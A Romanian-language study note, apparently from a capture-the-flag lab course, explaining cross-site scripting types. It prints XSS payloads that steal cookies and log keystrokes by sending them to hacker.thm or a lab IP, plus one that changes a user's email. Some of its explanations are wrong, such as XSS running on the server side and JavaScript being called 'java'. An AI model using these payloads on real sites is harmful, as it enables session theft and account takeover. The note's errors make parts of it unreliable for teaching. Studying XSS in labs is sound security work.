XSS Cross Site Stipting - este o vulnerabilitate care permite executarea codului `java` pe partea de server dificultatea poate varia de la foarte simple spre foarte complicate.
Sunt 3 tipuri esentiale de [[XSS]]:
- DOM XSS (Document Object Model-based Cross-site Scripting) - foloste de obicei [[HTML]] pentru a execut `javascript` cu ajutorul tegului `<script></script>`
- Persistent (Server-side) - se ruleaza atunci cand serverul incarca pagina sunt de obicei in gasite in postarile de comentariu
- Reflected (Client-side) - la fel este cod `javascript` este posibil daca nu sa verificat date introduse de utilizator.
Atunci cand folosim componentele a lui [[HTML]] acest tip se mai numeste si [[XFS]] (Cross-Frame Scripting) 
-----------------

XSS (Cross Site Scripting) â†’ este bazat pe [[JavaScript]]. Este un tip de atack care permite executarea codului [[JavaScript]] pe partea de server.
```java
<script>alert('XSS');</script>
```
Acesta este un `payload` simplu ca sa arate ca conceplut sau ca este vulnerabil la asa tip de atack.
Cu urmatorul `payload` putem fura seansul de `cookie`:
```java
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```
Si pe urma sa ne logam ca utilizatorul dat.
Un `keyloger` care va transmite toata informatia pe serviciul nostru:
```java
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```
Un `payload` mai specific pentru o functie anumita pe sistemul nostru de exemplu `user.changeEmail()`:
```java
<script>user.changeEmail('attacker@hacker.thm');</script>
```
### Reflected XSS
Reflected XSS apare atunci cand datele la utilizator sunt introduse direct in site-ul nostru.
![[Pasted image 20240507144628.png]]
Serviciul nu verifica `inputul` de la utilizator si putem executa cod malentios:
![[Pasted image 20240507144720.png]]
Daca sa totalirizam avem asa un fel de schema:
![[Pasted image 20240507144816.png]]
### Store XSS
Acest tip de `payload` se salveaza in baza de date si este executat atunci cand alti utilizatori aceseaza serviciul dat. 
In felul data ar putea arata un astfel de atack:
![[Pasted image 20240507150117.png]]
### XSS on DOM
?
### Blind XSS
Pentru a verifica `XSS` vulnerabilitati putem folosi instrumentul `XSS Hunter Express`.
### Polyglots


Daca este vulnerabil la acest tip de atack putem primi si datele despre sessia lui:
```java
</textarea><script>fetch('http://10.8.228.3:9001?cookie=' + btoa(document.cookie) );</script>
```
